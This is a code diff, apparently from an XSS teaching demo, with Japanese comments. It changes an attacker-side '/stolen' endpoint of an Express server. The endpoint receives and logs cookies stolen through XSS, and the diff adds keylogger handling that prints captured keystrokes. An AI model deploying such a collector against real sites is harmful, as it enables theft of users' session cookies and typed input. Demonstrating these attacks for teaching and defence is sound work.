@@ -86,10 +86,16 @@ function attackerPage() {
 </body></html>`
 }
 
-// XSS で盗まれたCookieを受け取るエンドポイント（デモ用）
+// XSS で盗まれたデータを受け取るエンドポイント（デモ用）
 app.get('/stolen', (req, res) => {
-  const stolen = req.query.c || '（空）'
-  console.log(`\n💀 盗まれたCookie: ${stolen}\n`)
+  if (req.query.c !== undefined) {
+    const cookie = req.query.c || '（空 — HttpOnly が有効なため読めない）'
+    console.log(`\n💀 盗まれたCookie: ${cookie}\n`)
+  }
+  if (req.query.key !== undefined) {
+    // キーロガー：1文字ずつ出力
+    process.stdout.write(req.query.key === 'Enter' ? '\n' : req.query.key)
+  }
   res.set('Access-Control-Allow-Origin', '*')
   res.send('ok')
 })
